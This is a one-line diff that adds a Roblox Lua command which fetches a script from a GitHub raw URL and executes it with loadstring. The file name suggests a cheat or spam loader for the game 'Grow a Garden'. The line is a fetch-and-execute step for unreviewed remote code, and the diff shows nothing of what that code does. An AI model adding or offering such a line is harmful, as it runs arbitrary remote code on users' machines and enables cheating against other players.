@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/grow-a-garden-spam6-n8okkdidmkfurp.lua"))()
